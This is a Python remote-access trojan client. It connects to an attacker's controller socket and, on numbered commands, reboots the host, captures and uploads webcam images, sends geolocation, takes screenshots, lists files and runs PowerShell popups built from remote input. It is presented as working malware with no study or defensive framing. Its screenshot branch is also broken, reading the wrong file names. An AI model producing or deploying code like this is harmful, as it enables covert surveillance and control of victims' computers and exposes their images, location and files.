import os
import cv2
import pyautogui
import requests
from socket import *

def get_location():
    try:
        res = requests.get("https://ipinfo.io/json").json()
        loc = res["loc"]
        lat, lon = loc.split(",")
        return float(lat), float(lon)
    except:
        return None, None

s = socket()
s.connect(('0.0.0.0', 6427))  # Replace with your controller IP

while True:
    choice = s.recv(1024).decode()

    if choice == '1':
        break

    elif choice == '2':
        os.system('shutdown -r -t 5')

    elif choice == '3':
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cv2.imwrite('webcam.png', frame)
        cap.release()

        file_size = os.path.getsize('webcam.png')
        s.send(str(file_size).encode())
        s.recv(1024)
        with open('webcam.png', 'rb') as f:
            for data in f:
                s.send(data)

    elif choice == '4':
        lat, lon = get_location()
        msg = f"Latitude: {lat}\nLongitude: {lon}" if lat else "Location not available"
        s.send(msg.encode())

    elif choice == '5':  # Screenshot
        screenshot = pyautogui.screenshot()
        screenshot.save('screenshot.png')

        file_size = os.path.getsize('1.png')
        s.send(str(file_size).encode())
        s.recv(1024).decode()
        with open('webcam.png', 'rb') as f:
            for data in f:
                s.send(data)

    elif choice == '6':  # List current directory
        files = '\n'.join(os.listdir('.'))
        s.send(files.encode())

    elif choice == '7':  # Show popup
        msg = s.recv(1024).decode()
        os.system(f'powershell -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show(\'{msg}\')"')
